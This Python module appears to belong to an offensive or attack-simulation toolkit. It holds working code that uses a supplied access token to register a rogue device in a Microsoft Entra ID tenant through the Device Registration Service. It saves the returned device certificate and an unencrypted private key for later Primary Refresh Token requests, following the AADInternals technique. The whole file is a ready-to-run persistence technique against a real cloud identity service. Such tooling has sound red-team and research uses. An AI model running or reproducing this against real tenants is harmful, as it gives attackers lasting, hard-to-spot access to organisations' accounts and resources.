import base64
import logging
import struct
import uuid

import requests
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import NameOID

BCRYPT_RSAPUBLIC_MAGIC = 0x31415352  # 'RSA1'


def _build_transport_key_blob(public_key):
    # DRS expects the TransportKey as a base64 Windows CNG BCRYPT_RSAPUBLIC_BLOB,
    # not a PEM/DER key. AADInternals reuses the device's own key pair for this
    # "to make things simpler", which is what we do here too.
    # https://github.com/Gerenios/AADInternals/blob/master/PRT_Utils.ps1#L98
    numbers = public_key.public_numbers()
    modulus = numbers.n.to_bytes((numbers.n.bit_length() + 7) // 8, "big")
    exponent = numbers.e.to_bytes((numbers.e.bit_length() + 7) // 8, "big")

    header = struct.pack(
        "<6I",
        BCRYPT_RSAPUBLIC_MAGIC,
        len(modulus) * 8,  # BitLength
        len(exponent),     # cbPublicExp
        len(modulus),      # cbModulus
        0,                 # cbPrime1 (unused for public key)
        0,                 # cbPrime2 (unused for public key)
    )
    return base64.b64encode(header + exponent + modulus).decode()


def register_device(auth_config, params, token=False):
    """
    Registers a new device object in Entra ID via the Device Registration Service (DRS)

    Requires an access token scoped for the Device Registration Service
    Based on https://github.com/Gerenios/AADInternals/blob/master/PRT_Utils.ps1
    """
    logging.info("Running the register_device technique")

    access_token = token.get("access_token") if token else None
    if not access_token:
        logging.error("A DRS-scoped access token is required to register a device.")
        return

    tenant_domain = params.get("tenant_domain")
    if not tenant_domain:
        logging.error("tenant_domain parameter is required (e.g. contoso.onmicrosoft.com).")
        return

    device_name = params.get("device_name", "DESKTOP-MSINVADER")
    os_version = params.get("os_version", "10.0.19041.928")
    join_type = params.get("join_type", 4)  # 4 = Azure AD register, 0 = Azure AD join

    device_id = str(uuid.uuid4())

    # This key pair is the device's identity going forward - it signs the CSR now
    # and later authenticates PRT requests, so it must be persisted, not discarded.
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

    csr = (
        x509.CertificateSigningRequestBuilder()
        .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, device_id)]))
        .sign(private_key, hashes.SHA256())
    )
    csr_b64 = base64.b64encode(csr.public_bytes(serialization.Encoding.DER)).decode()

    url = "https://enterpriseregistration.windows.net/EnrollmentServer/device/?api-version=1.0"

    headers = {
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json; charset=utf-8",
    }

    transport_key_b64 = _build_transport_key_blob(private_key.public_key())

    body = {
        "CertificateRequest": {
            "Type": "pkcs10",
            "Data": csr_b64,
        },
        "Attributes": {
            "ReuseDevice": "True",
            "ReturnClientSid": "True",
            "SharedDevice": "False",
        },
        "TransportKey": transport_key_b64,
        "TargetDomain": tenant_domain,
        "DeviceDisplayName": device_name,
        "DeviceType": "Windows",
        "OSVersion": os_version,
        "JoinType": join_type,
    }

    try:
        response = requests.post(url, headers=headers, json=body)
    except Exception as e:
        logging.error(f"Exception during device registration: {e}")
        return

    if response.status_code not in (200, 201):
        logging.error(f"Device registration failed: {response.status_code} {response.text}")
        return

    result = response.json()
    cert_b64 = result.get("Certificate", {}).get("RawBody")
    returned_device_id = result.get("DeviceId", device_id)

    if not cert_b64:
        logging.error(f"Device registration response did not include a certificate: {result}")
        return

    key_path = params.get("key_out", f"{returned_device_id}_device.key")
    cert_path = params.get("cert_out", f"{returned_device_id}_device.p7b")

    with open(key_path, "wb") as f:
        f.write(private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption(),
        ))

    with open(cert_path, "wb") as f:
        f.write(base64.b64decode(cert_b64))

    logging.info(f"Registered device '{device_name}' with DeviceId {returned_device_id}")
    logging.info(f"Device private key saved to {key_path}, device certificate saved to {cert_path}")

    return {
        "device_id": returned_device_id,
        "private_key": private_key,
        "certificate_b64": cert_b64,
        "key_path": key_path,
        "cert_path": cert_path,
    }
